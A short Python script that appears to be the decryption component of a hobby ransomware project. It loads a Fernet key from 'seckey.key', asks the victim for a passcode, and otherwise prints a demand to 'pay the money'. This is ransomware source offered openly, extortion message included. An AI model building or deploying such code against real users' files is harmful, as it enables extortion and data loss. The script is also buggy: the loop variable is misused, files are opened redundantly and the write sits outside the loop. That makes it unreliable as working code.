import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    
    if file =='ransomeware.py' or file == 'seckey.key' or file == 'decrpt.py':
        continue
    if os.path.isfile(file):
      files.append(file)
       
with open("seckey.key", "rb") as k :
    secretkey = k.read()
    
secret_phrase = "Kunj"

user_entry = input("Enter the secret code to decrypt your files:")

if user_entry == secret_phrase:
    #Logic to decrypt all the files
    for files in files :
        with open(file, 'rb') as theFile :
              with open(file, 'rb') as theFile :
                   content = theFile.read()
                   decrpyted_content = Fernet(secretkey).decrypt(content)
     
    with open(file, 'wb') as theFile :
          theFile.write(decrpyted_content)
    print("Great files decrypted")
else :
    print("Wrong passcode, pay the money to get the right passcode")